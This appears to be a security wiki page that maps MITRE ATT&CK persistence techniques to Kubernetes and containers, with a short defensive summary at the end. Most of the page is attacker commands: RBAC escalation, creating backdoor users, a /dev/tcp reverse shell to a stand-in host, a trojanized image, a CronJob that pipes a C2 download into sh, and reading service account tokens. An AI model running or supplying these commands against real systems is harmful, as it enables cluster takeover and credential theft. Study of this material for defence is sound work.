# Persistence

## **Persistence Techniques in Containerized Environments**

In Kubernetes and other containerized infrastructures, adversaries use Persistence techniques to maintain long-term access beyond initial compromise.\
Persistence enables attackers to survive pod restarts, node reboots, or partial cluster recovery by embedding themselves into cluster resources, container workloads, or orchestration layers.

***

### Account Manipulation T1098

**Description:**

Account Manipulation occurs when an adversary creates, modifies, or abuses existing accounts to maintain access, escalate privileges, or blend in with legitimate users.\
In containerized environments, this typically involves manipulating Kubernetes service accounts, RBAC roles, ClusterRoles, or user credentials at the orchestration or host level.

By controlling accounts or permissions inside a cluster, attackers embed themselves persistently and disguise their operations under the identity of valid system users.

#### Additional Container Cluster Roles **T1098.004**&#x20;

**Description**:\
Modify or assign elevated roles to users, service accounts, or groups within the cluster to ensure privileged access persists.

**Container Example**:

* Add an attacker-controlled user to the `cluster-admin` role:

```bash
kubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --user attacker@corp.com
```

* Patch existing role bindings to include attacker identities:

```bash
kubectl patch clusterrolebinding system:controller:job-controller -p '{"subjects":[{"kind":"User","name":"attacker"}]}'
```

**Result**:\
Attackers retain high privileges within the cluster even if initially compromised pods or nodes are cleaned up.

***

### Create Account T1136

**Description:**

Create Account refers to adversaries creating new accounts (local, domain, cloud, or cluster-level) to establish persistence inside a compromised environment.

In containerized environments, attackers may create new Linux users on container hosts, Kubernetes nodes, or inside privileged containers.\
They might also create new service accounts or user identities within the cluster to blend in and survive reboot or redeployment events.

Created accounts act as backdoors that legitimate users and admins may overlook if no immediate suspicious activity follows.

#### Local Account **T1136.001**

**Description**:\
Create new local accounts inside containers, on container hosts, or on cluster management nodes to maintain persistent access.

**Container Example**:

* Escape to host (privileged container) and create a new Linux user:

```bash
useradd attacker && echo "attacker:Password123" | chpasswd
```

* Modify `/etc/passwd` from writable containers or sidecars.

**Result**:\
Long-term foothold on hosts or nodes using newly created local users.

***

### Create or Modify System Process **T1543**

**Description:**

Create or Modify System Process refers to adversaries creating new processes or modifying existing ones that automatically execute attacker-controlled code.

In containerized environments, this typically involves deploying new Kubernetes resources (like Deployments, DaemonSets, or InitContainers) or modifying existing ones to ensure persistent execution of malicious containers or commands.

By embedding themselves into the container or cluster orchestration system, attackers ensure malware or backdoors are relaunched automatically after restarts, scaling events, or cluster upgrades.

**Container Service T1543.003**&#x20;

**Description**:\
Create or alter containerized services or workloads (e.g., Deployments, DaemonSets) that automatically restart malicious containers or code.

**Container Example**:

* Patch a Deployment to use a malicious image:

```bash
kubectl set image deployment/metrics-server metrics=attacker/metrics:latest
```

* Abuse `initContainers` to run pre-persistence scripts during workload startup.

**Result**:\
Malicious code is relaunched automatically even after pod crashes or redeployments.

***

#### External Remote Services **T1133**

**Description**:\
Maintain access by setting up external remote access paths like SSH, reverse shells, or API backdoors.

**Container Example**:

* Drop a reverse shell inside a compromised container:

```bash
bash -i >& /dev/tcp/evilserver.com/443 0>&1
```

* Install an SSH server inside a lightweight container:

```bash
apt-get update && apt-get install -y openssh-server && service ssh start
```

{% hint style="danger" %}
The command above will depend on your OS. This is is Ubuntu.  Confirm with /etc/os-release for commands specific to your OS.
{% endhint %}

**Result**:\
Reliable out-of-band access path for attackers even if Kubernetes API access is revoked.

***

### Implant Internal Image T1525

**Description**:\
Upload backdoored container images to trusted internal registries to infect future deployments.

**Container Example**:

* Build a trojanized image:

```dockerfile
FROM nginx
ADD shell.sh /tmp/shell.sh
CMD ["bash", "/tmp/shell.sh"]
```

* Push it to an internal trusted registry:

```bash
docker tag evil-image registry.local/internal/nginx
docker push registry.local/internal/nginx
```

**Result**:\
Attackers wait for CI/CD pipelines or unsuspecting users to deploy their backdoor image.

***

### Scheduled Task/Job T1053

**Description**

Adversaries may abuse scheduled task mechanisms to execute malicious code automatically at predefined times or intervals.\
In containerized environments, this often involves creating Kubernetes CronJobs or other orchestration-level scheduled tasks.

Using scheduled jobs allows attackers to persist after reboot, periodically beacon to C2 servers, pull new payloads, or maintain access without continuous interaction.\
Scheduling execution provides automation, covert operation windows, and resilience against remediation efforts.

#### **Result**

* Persistent execution of attacker-controlled code, surviving pod crashes or node reboots.
* Stealthier C2 communication or data exfiltration by using short-lived, periodic connections.
* Automated reinstallation of malware or backdoors after defender cleanup efforts.

#### Container Orchestration Job **T1053.007**

**Description**:\
Leverage Kubernetes CronJobs to schedule recurring malicious execution.

**Container Example**:

* Drop a CronJob that beacons to a C2 server every 15 minutes:

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: sleeper-agent
spec:
  schedule: "*/15 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: sleeper
            image: busybox
            command: ["/bin/sh", "-c", "curl http://c2/sh | sh"]
          restartPolicy: OnFailure
```

**Result**:\
Resilient persistence method — if other footholds fail, scheduled jobs reestablish access.

***

#### &#x20;Default Accounts **T1078.001**&#x20;

**Description**:\
Exploit default service accounts, default secrets, or default credentials in container environments.

**Container Example**:

* Use default Kubernetes service account tokens:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

* Exploit applications deployed with admin/admin credentials (e.g., dashboards, monitoring tools).

✅ **Result**:\
Unauthorized persistent access leveraging weak or unchanged credentials.

***

### Valid Accounts T1078

Valid Accounts refers to adversaries leveraging existing, legitimate credentials to gain access to systems or environments.

In containerized environments, this often means attackers abuse Kubernetes service accounts, default or exposed credentials, or previously stolen cloud IAM identities to authenticate and operate without raising immediate suspicion.

By using valid accounts, adversaries bypass traditional security controls (like firewall rules or authentication systems) because they appear to be authorized users or services.

#### Local Accounts **T1078.003**

**Description**:\
Use stolen or previously created local user accounts on hosts or container nodes for persistent access.

**Container Example**:

* Log in using a local account created during earlier access:

```bash
ssh attacker@compromised-node
```

* Install SSH keys to `/root/.ssh/authorized_keys` by mounting the host filesystem inside a container.

**Result**:\
Persistent backdoor through host-level account access.

***

### **Persistence Techniques in Containerized Environments (MITRE Mapped)**

| Technique/Subtechnique             | MITRE ID              | Container Example                                 |
| ---------------------------------- | --------------------- | ------------------------------------------------- |
| Additional Container Cluster Roles | T1098.004             | Modify or escalate Kubernetes roles               |
| Local Account Creation             | T1136.001             | Create Linux users on hosts or containers         |
| Container Service Modification     | T1543.003             | Alter Deployments or DaemonSets for persistence   |
| External Remote Services           | T1133                 | Set up SSH or reverse shells inside containers    |
| Implant Internal Image             | (Persistence Pattern) | Trojanize and push malicious images               |
| Container Orchestration Job        | T1053.007             | Deploy Kubernetes CronJobs for periodic execution |
| Default Accounts                   | T1078.001             | Abuse default service accounts or secrets         |
| Local Accounts                     | T1078.003             | Persist via host or container local user accounts |

***

## Final Summary

Defending against Persistence in container environments focuses on:

* **Hardening Kubernetes RBAC and default accounts**
* **Auditing and monitoring all deployments, service accounts, and CronJobs**
* **Securing internal container registries**
* **Restricting host-level filesystem access and container privileges**
